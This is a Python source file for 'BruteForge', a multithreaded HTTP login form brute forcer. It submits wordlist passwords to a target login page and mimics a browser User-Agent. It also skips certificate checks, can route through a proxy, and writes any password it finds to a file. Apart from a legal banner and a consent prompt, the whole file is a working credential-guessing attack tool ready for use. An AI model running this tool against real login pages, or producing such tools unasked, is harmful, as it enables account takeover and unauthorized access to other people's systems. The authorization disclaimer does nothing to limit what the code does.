#!/usr/bin/env python3
"""
BruteForge — HTTP Login Form Brute Forcer
Pair with WordForge to test login pages on systems you own or are authorized to test.

Usage:
    python3 bruteforge.py
    python3 bruteforge.py --url http://target/login --user admin --wordlist wordlist.txt
                          --user-field username --pass-field password --fail-text "Invalid"
"""

import argparse
import sys
import time
import threading
import queue
import signal
from datetime import datetime

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[-] Missing dependency: pip install requests")
    sys.exit(1)


# ─── Globals ──────────────────────────────────────────────────────────────────

found_password = None
stop_event = threading.Event()
lock = threading.Lock()
attempts = 0
start_time = None


# ─── Banner ───────────────────────────────────────────────────────────────────

def banner():
    print("""
╔══════════════════════════════════════════════════════╗
║        BruteForge — HTTP Login Brute Forcer          ║
║        For authorized penetration testing only       ║
╚══════════════════════════════════════════════════════╝
""")


def disclaimer():
    print("""
  [!] LEGAL NOTICE
  ─────────────────────────────────────────────────────
  This tool is for authorized testing ONLY.
  Only use against systems you own or have explicit
  written permission to test.
  Unauthorized use is illegal. Use responsibly.
  ─────────────────────────────────────────────────────
""")
    answer = input("  Do you confirm you have authorization? (yes/no): ").strip().lower()
    if answer != "yes":
        print("  Exiting. Please only test systems you are authorized to test.")
        sys.exit(0)
    print()


# ─── Core Worker ──────────────────────────────────────────────────────────────

def try_login(session, url, username, password, user_field, pass_field,
              extra_fields, fail_text, success_text, success_code, timeout, proxy):
    """Attempt a single login. Returns True if password found."""
    payload = {user_field: username, pass_field: password}
    payload.update(extra_fields)

    proxies = {"http": proxy, "https": proxy} if proxy else None

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    try:
        resp = session.post(
            url,
            data=payload,
            headers=headers,
            timeout=timeout,
            verify=False,
            allow_redirects=True,
            proxies=proxies,
        )

        # Determine success
        if success_text and success_text.lower() in resp.text.lower():
            return True
        if success_code and resp.status_code == success_code:
            return True
        if fail_text and fail_text.lower() not in resp.text.lower():
            # If fail text is absent → likely success
            return True
        return False

    except requests.exceptions.ConnectionError:
        return None  # Network error — signal caller to retry
    except requests.exceptions.Timeout:
        return None
    except Exception:
        return False


def worker(task_queue, url, username, user_field, pass_field,
           extra_fields, fail_text, success_text, success_code,
           timeout, delay, proxy):
    global found_password, attempts

    session = requests.Session()

    while not stop_event.is_set():
        try:
            password = task_queue.get(timeout=1)
        except queue.Empty:
            break

        result = try_login(
            session, url, username, password,
            user_field, pass_field, extra_fields,
            fail_text, success_text, success_code,
            timeout, proxy
        )

        with lock:
            attempts += 1
            elapsed = time.time() - start_time
            rate = attempts / elapsed if elapsed > 0 else 0
            remaining = task_queue.qsize()
            print(f"\r  [{attempts:>6}] Trying: {password:<30}  {rate:.1f} pwd/s  |  {remaining} left   ",
                  end="", flush=True)

        if result is True:
            with lock:
                found_password = password
            stop_event.set()
            print()
            break

        if result is None:
            # Brief pause on network error then requeue
            time.sleep(2)
            task_queue.put(password)

        task_queue.task_done()

        if delay > 0:
            time.sleep(delay)


# ─── Progress Reporter ────────────────────────────────────────────────────────

def print_progress(total):
    while not stop_event.is_set():
        elapsed = time.time() - start_time
        done = attempts
        rate = done / elapsed if elapsed > 0 else 0
        pct = (done / total * 100) if total > 0 else 0
        eta = (total - done) / rate if rate > 0 else 0
        eta_str = time.strftime("%H:%M:%S", time.gmtime(eta)) if rate > 0 else "--:--:--"
        # Progress line is updated by worker; this thread just sleeps
        time.sleep(5)
        print(f"\n  [*] Progress: {done}/{total} ({pct:.1f}%)  |  Rate: {rate:.1f} pwd/s  |  ETA: {eta_str}")


# ─── Interactive Setup ────────────────────────────────────────────────────────

def interactive_setup():
    print("  === Target Configuration ===\n")

    url = input("  Target URL (e.g. http://192.168.1.1/login): ").strip()
    if not url.startswith("http"):
        url = "http://" + url

    username = input("  Username to test: ").strip()
    wordlist = input("  Path to wordlist file: ").strip()

    print("\n  === Form Fields ===")
    print("  (Inspect the login page HTML to find the field names)")
    user_field = input("  Username field name [default: username]: ").strip() or "username"
    pass_field = input("  Password field name [default: password]: ").strip() or "password"

    print("\n  === Detection ===")
    print("  How to detect a FAILED login? (check page source for error text)")
    fail_text = input("  Failure text (e.g. 'Invalid password', 'Wrong', 'Error'): ").strip()
    success_text = input("  Success text (optional, e.g. 'Welcome', 'Dashboard'): ").strip()

    print("\n  === Speed & Safety ===")
    try:
        threads = int(input("  Number of threads [default: 5]: ").strip() or "5")
        delay = float(input("  Delay between requests in seconds [default: 0]: ").strip() or "0")
        timeout = int(input("  Request timeout seconds [default: 10]: ").strip() or "10")
    except ValueError:
        threads, delay, timeout = 5, 0, 10

    proxy = input("  Proxy (optional, e.g. http://127.0.0.1:8080): ").strip() or None

    return {
        "url": url,
        "username": username,
        "wordlist": wordlist,
        "user_field": user_field,
        "pass_field": pass_field,
        "fail_text": fail_text,
        "success_text": success_text,
        "threads": threads,
        "delay": delay,
        "timeout": timeout,
        "proxy": proxy,
    }


# ─── CLI Args ─────────────────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="BruteForge — HTTP Login Form Brute Forcer",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("--url",        help="Target login URL")
    parser.add_argument("--user",       help="Username to test")
    parser.add_argument("--wordlist",   help="Path to wordlist file")
    parser.add_argument("--user-field", default="username", help="HTML username field name")
    parser.add_argument("--pass-field", default="password", help="HTML password field name")
    parser.add_argument("--fail-text",  default="",         help="Text present on failed login")
    parser.add_argument("--success-text", default="",       help="Text present on successful login")
    parser.add_argument("--threads",    type=int, default=5,   help="Number of threads (default: 5)")
    parser.add_argument("--delay",      type=float, default=0, help="Delay between requests (seconds)")
    parser.add_argument("--timeout",    type=int, default=10,  help="Request timeout (seconds)")
    parser.add_argument("--proxy",      default=None,          help="Proxy URL (e.g. http://127.0.0.1:8080)")
    return parser.parse_args()


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    global start_time

    args = parse_args()

    banner()
    disclaimer()

    # Use interactive mode if required args are missing
    if not args.url or not args.user or not args.wordlist:
        cfg = interactive_setup()
    else:
        cfg = {
            "url": args.url,
            "username": args.user,
            "wordlist": args.wordlist,
            "user_field": args.user_field,
            "pass_field": args.pass_field,
            "fail_text": args.fail_text,
            "success_text": args.success_text,
            "threads": args.threads,
            "delay": args.delay,
            "timeout": args.timeout,
            "proxy": args.proxy,
        }

    # Load wordlist
    try:
        with open(cfg["wordlist"], "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"\n[-] Wordlist not found: {cfg['wordlist']}")
        sys.exit(1)

    total = len(passwords)
    print(f"\n  [*] Target  : {cfg['url']}")
    print(f"  [*] Username: {cfg['username']}")
    print(f"  [*] Wordlist: {total:,} passwords loaded")
    print(f"  [*] Threads : {cfg['threads']}")
    print(f"  [*] Started : {datetime.now().strftime('%H:%M:%S')}\n")

    if not cfg["fail_text"] and not cfg["success_text"]:
        print("  [!] Warning: No detection text set. Results may be inaccurate.\n")

    # Build task queue
    task_q = queue.Queue()
    for pw in passwords:
        task_q.put(pw)

    # Ctrl+C handler
    def handle_interrupt(sig, frame):
        print("\n\n  [!] Interrupted by user. Stopping...")
        stop_event.set()
    signal.signal(signal.SIGINT, handle_interrupt)

    start_time = time.time()

    # Launch threads
    thread_list = []
    for _ in range(cfg["threads"]):
        t = threading.Thread(
            target=worker,
            args=(
                task_q,
                cfg["url"], cfg["username"],
                cfg["user_field"], cfg["pass_field"],
                {},  # extra form fields (CSRF tokens etc. can be added here)
                cfg["fail_text"], cfg["success_text"],
                None,  # success_code
                cfg["timeout"], cfg["delay"], cfg["proxy"]
            ),
            daemon=True
        )
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    elapsed = time.time() - start_time
    print(f"\n\n  [*] Finished in {elapsed:.1f}s | {attempts:,} attempts | "
          f"{attempts/elapsed:.1f} pwd/s")

    if found_password:
        print(f"\n  ╔══════════════════════════════════════════╗")
        print(f"  ║  [+] PASSWORD FOUND!                     ║")
        print(f"  ║  Username : {cfg['username']:<30}║")
        print(f"  ║  Password : {found_password:<30}║")
        print(f"  ╚══════════════════════════════════════════╝\n")

        # Save result
        result_file = f"found_{cfg['username']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(result_file, "w") as f:
            f.write(f"URL:      {cfg['url']}\n")
            f.write(f"Username: {cfg['username']}\n")
            f.write(f"Password: {found_password}\n")
            f.write(f"Found at: {datetime.now()}\n")
        print(f"  [+] Result saved to: {result_file}")
    else:
        print("\n  [-] Password not found in the provided wordlist.")
        print("  [*] Try generating a bigger wordlist with WordForge:")
        print("      python3 wordlist_generator.py keyword1 keyword2 keyword3\n")


if __name__ == "__main__":
    main()
